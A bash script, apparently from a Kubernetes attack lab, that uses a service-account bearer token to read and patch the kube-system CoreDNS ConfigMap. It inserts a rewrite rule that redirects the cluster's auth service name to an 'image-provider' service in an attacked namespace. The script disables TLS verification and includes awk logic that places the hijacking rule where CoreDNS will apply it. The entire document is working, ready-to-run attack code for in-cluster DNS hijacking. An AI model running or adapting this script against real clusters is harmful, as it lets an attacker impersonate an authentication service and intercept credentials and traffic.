#!/usr/bin/env bash
set -eu

# --- Config ---
REWRITE_LINE="rewrite name auth.$AUTH_NS.svc.cluster.local image-provider.$ATTACKED_NS.svc.cluster.local"
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
TOKEN_PATH="$DATA_PATH/KC1/token"
NS="kube-system"
CM_NAME="coredns"
TOKEN=$(cat ${TOKEN_PATH})
TMP_FILE="$DATA_PATH/KC1/Corefile"

# Installing dependencies and setup
apt-get update >/dev/null 2>&1
apt-get install -y --no-install-recommends curl jq mawk grep bash ca-certificates >/dev/null 2>&1
mkdir -p $(dirname $TMP_FILE)

# --- HTTP helpers ---
api_get() {
  path="$1"
  curl -k --fail --silent --show-error \
    -H "Authorization: Bearer $TOKEN" \
    -H "Accept: application/json" \
    "$APISERVER$path"
}

api_patch_json() {
  path="$1"
  curl -k --fail --silent --show-error \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/merge-patch+json" \
    -X PATCH \
    --data-binary @- \
    "$APISERVER$path"
}

api_patch_strategic() {
  path="$1"
  curl -k --fail --silent --show-error \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/strategic-merge-patch+json" \
    -X PATCH \
    --data-binary @- \
    "$APISERVER$path"
}

# --- 1) Read ConfigMap coredns ---
set +e
CM_JSON="$(api_get "/api/v1/namespaces/${NS}/configmaps/${CM_NAME}" 2>&1)"
rc="$?"
set -e

if [ "$rc" -ne 0 ]; then
  echo "$CM_JSON" | grep -qi "NotFound" && { echo "Error: ConfigMap ${CM_NAME} not found in ${NS}." >&2; exit 1; }
  echo "$CM_JSON" | grep -qi "Forbidden" && { echo "403 Forbidden: SA without grents on configmaps/${CM_NAME} in ${NS}." >&2; exit 1; }
  echo "$CM_JSON" >&2
  exit 1
fi

CORE_ORIG="$(printf '%s' "$CM_JSON" | jq -r '.data.Corefile')"
if [ -z "$CORE_ORIG" ] || [ "$CORE_ORIG" = "null" ]; then
  echo "Error: .data.Corefile doesn't exists in ConfigMap ${CM_NAME} in ${NS}" >&2
  exit 1
fi

# --- 2) Prepare new Corefile ---
printf '%s\n' "$CORE_ORIG" > $TMP_FILE

# Check if rewrite is already present in the good place of the file
if awk -v ins="$REWRITE_LINE" '
  BEGIN{depth=0; found=0}
  {
    line=$0
    t=line; sub(/^[[:space:]]*/,"",t)
    if (depth==1 && t==ins) { found=1; exit }
    oc=gsub(/{/,"{"); cc=gsub(/}/,"}"); depth+=oc-cc
  }
  END{ exit found?0:1 }
' $TMP_FILE; then
  echo "[=] Rewrite already present in the correct place. No modifications."
  NEED_PATCH=0
else
  # If exists a block "health" in the top level, put rewrite line immediately after
  if grep -qE '^[[:space:]]*health([[:space:]]|$)' $TMP_FILE; then
    awk -v ins="$REWRITE_LINE" '
      BEGIN{depth=0; in_health=0; inserted=0}
      {
        line=$0

        # Remove line alredy present but in the wrong place
        t=line; sub(/^[[:space:]]*/,"",t)
        if (t==ins && depth!=1) next

        print line

        # Mark to the health block
        if (depth==1 && line ~ /^[[:space:]]*health([[:space:]]|$)/) in_health=1

        oc=gsub(/{/,"{"); cc=gsub(/}/,"}"); depth+=oc-cc

        # Exit from health: back to depth==1 -> putting rewrite immediately after the block
        if (in_health && depth==1 && !inserted) {
          printf "    %s\n", ins
          inserted=1
          in_health=0
        }
      }
    ' $TMP_FILE > $TMP_FILE.new
  else
    # Otherwise put rewrite line after the opening of the server block ".:53 {"
    awk -v ins="$REWRITE_LINE" '
      BEGIN{inserted=0}
      {
        line=$0
        # deletion of every duplication of the line
        t=line; sub(/^[[:space:]]*/,"",t)
        if (t==ins) next

        print line
        if (!inserted && line ~ /^[[:space:]]*\.\:53[[:space:]]*\{[[:space:]]*$/) {
          printf "    %s\n", ins
          inserted=1
        }
      }
    ' $TMP_FILE > $TMP_FILE.new
  fi
  NEED_PATCH=1
fi

# --- 3) Apply patch to ConfigMap (only if needed) ---
if [ "${NEED_PATCH}" -eq 1 ]; then
  echo "[+] Patch del ConfigMap ${CM_NAME} in ${NS}..."
  CORE_NEW="$(cat $TMP_FILE.new)"
  jq -n --arg core "$CORE_NEW" '{data:{Corefile:$core}}' \
    | api_patch_json "/api/v1/namespaces/${NS}/configmaps/${CM_NAME}" >/dev/null
  echo "[+] Patch done."
else
  echo "[=] No patch applied."
fi

rm -f $TMP_FILE $TMP_FILE.new
echo "[OK] Done."